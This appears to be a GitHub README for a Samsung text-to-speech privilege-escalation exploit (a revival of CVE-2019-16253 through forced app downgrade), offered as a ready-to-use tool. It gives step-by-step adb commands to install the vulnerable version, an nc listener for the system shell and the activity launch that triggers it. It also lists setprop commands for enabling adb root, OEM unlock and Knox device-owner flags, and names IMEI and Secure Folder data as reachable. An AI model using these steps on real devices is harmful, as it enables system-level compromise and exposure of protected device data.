# K0mraid3s-System-Shell
Way back in 2019, a vulnerability that would come to be known as "CVE-2019-16253" was found that affect Samsung's TTS engine in versions prior to 3.0.02.7. This exploit allowed for a local attacker to escalate privileges to system privileges and was later patched by Samsung.

Essentially, Samsung's TTS app would blindly accept any data that it received from the TTS engine. You can pass the TTS engine a library that will then be given to the TTS application, which in turn will then load that library and execute it with system privileges, UID 1000 on Android. This was later patched so that the TTS app would verify the data coming from the engine, and the version installed, closing this particular loophole.

However, with Android 10, Google introduced the ability to rollback an application by installing it with the ENABLE_ROLLBACK parameter. This allows the user to revert a version of an app installed on the device to a previous version of the app installed on the device. I believe an oversight has allowed this to extend to Samsung's text-to-speech application, as well as any application on any Android 10+ device currently in the wild.

The root of this kill-chain all comes back to the '-d' flag added to the package-manager command when installing an application. It should only work for debuggable apps, but it works for non-debuggable applications as well and that is why the TTS app can be downgraded forcefully.

In other words, while the exploit in 2019 was fixed and an updated version of the TTS app was distributed, first one, now multiple workarounds & bypasses to install and exploit it on devices released three (and perhaps four) years later have been discovered, leading to questions on how many past exploits are revivable. 

In March, Samsung released a patch for the exploit, however, I was able to quickly find a workaround for the March Samsung patch and this has since been reported and patched, as well, concluding the 2 year saga of the infamous "TTS System Shell"


--------------------------------------

Simple guide -- 

1 Install all the apks, open atleast once.

2 Reboot, when device reboots, run the following command from ADB.

"adb shell pm install -r -d -f -g --full --install-reason 3 --enable-rollback /data/local/tmp/samsungTTSVULN2.apk 
"

3 in one console, type ```nc -lp 9999```

4 Run the following command in a second console: ```adb shell am start -n com.samsung.SMT/.gui.DownloadList```

DONE. 

if you have issues with it not starting, uninstall SMT (Samsung Text-To-Speech) completely, then reinstall the vuln version and try again from step 3 onward. 




PATCHED AS OF 02/2023
As seen on XDA before the public disclosure was removed by XDA Moderators.
It will otherwise remain unchanged here as an archive.

This is expected to work for all Samsung Mobile Devices made as of the time of writing this article, aside from some JDM devices. (01/19/2023)

Cool things that work:
Access to most of /efs /efs/imei /efs/sec_efs /efs/FactoryApp - Access to most of /data /data/system /data/user/0/ANY_SYSTEM_APP - The "Insthk" bin becomes useable, - Secure Folder/Separated Apps becomes COMPLETELY compromised if you also install the POC in it (UID 150_system) - start IOTHidden Menu, DM Mode, Service Mode, Multiple Debugging and hidden menus as well as preconfig in system context- Change many protected props, such as: 
setprop persist.service.adb.root 1
setprop service.adb.root 1
setprop sys.hidden.otatest 1
setprop sys.hiddenmenu.enable 1
setprop persist.sys.knox.device_owner true
setprop persist.sys.usb.qxdm.debug 1
setprop sys.usb.qxdm.debug 1
setprop presist.service.adb.enable 1
setprop persist.sys.usb.qxdm.debug 1
setprop service.adb.enable 1
setprop persist.rollback.is_test true
setprop sys.oem_unlock_allowed 1
aswell as quite a bit more.


The Easy Way -
Step 1 - Download "Komraids System Shell.zip", (attached is the latest version) and extract anywhere on desktop.
Step 2 - Push the "samsungTTSVULN2.apk" to /data/local/tmp
Step 3 - Ensure USB Debugging is ON, and computer is authorized. Also make sure power saving is OFF.
Step 4 - Install komraids_POC_V1.5.apk, reboot device.
Step 5 - When device is fully rebooted and unlocked, run systemshell.exe
Step 6 - You should now be in a shell with UID 1000. Enjoy. Be careful with what you mess with.

Things to note: The.exe only needs to be run once after each reboot, you can use it if you prefer, or, you can manually open a system shell yourself, by following Step 5, from "How it works?" below.

Don't be dumb, I'm not responsible for any dumb sh*t you do.
PWNED - K0mraid3 2022-10-06 175216.png

Huge thanks to @oakieville for the .exe and a lot of help tweaking the code of this project.


This project was brought to you by VAULT-TEC Dev Ops!
